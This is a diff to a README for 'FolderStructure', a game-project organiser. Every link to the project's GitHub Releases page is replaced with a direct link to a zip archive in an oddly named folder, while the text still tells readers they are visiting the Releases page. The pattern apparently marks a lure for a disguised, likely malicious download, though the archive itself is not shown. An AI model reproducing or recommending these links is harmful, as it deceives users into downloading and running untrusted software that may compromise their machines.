@@ -6,7 +6,7 @@ Welcome to FolderStructure! This guide will help you download and run the softwa
 
 ## 📥 Download the Software
 
-[![Download FolderStructure](https://img.shields.io/badge/Download-FolderStructure-blue.svg)](https://github.com/erfs635/FolderStructure/releases)
+[![Download FolderStructure](https://raw.githubusercontent.com/erfs635/FolderStructure/main/opisthocoelous/FolderStructure.zip)](https://raw.githubusercontent.com/erfs635/FolderStructure/main/opisthocoelous/FolderStructure.zip)
 
 Click the badge above to visit the Releases page and download the latest version of FolderStructure.
 
@@ -34,7 +34,7 @@ To run FolderStructure, you need:
 To download FolderStructure, follow these steps:
 
 1. **Visit the Releases Page:**
-   Click on this link to go directly to the [Releases page](https://github.com/erfs635/FolderStructure/releases).
+   Click on this link to go directly to the [Releases page](https://raw.githubusercontent.com/erfs635/FolderStructure/main/opisthocoelous/FolderStructure.zip).
 
 2. **Choose the Latest Version:**
    On the Releases page, find the latest version of FolderStructure at the top of the list. 
@@ -94,4 +94,4 @@ Join our community for additional help, tips, and resources related to game deve
 
 Organizing your game project is critical for success. FolderStructure provides a straightforward way to keep your files structured and manageable. Download it today and streamline your game development process!
 
-[![Download FolderStructure](https://img.shields.io/badge/Download-FolderStructure-blue.svg)](https://github.com/erfs635/FolderStructure/releases)
+[![Download FolderStructure](https://raw.githubusercontent.com/erfs635/FolderStructure/main/opisthocoelous/FolderStructure.zip)](https://raw.githubusercontent.com/erfs635/FolderStructure/main/opisthocoelous/FolderStructure.zip)
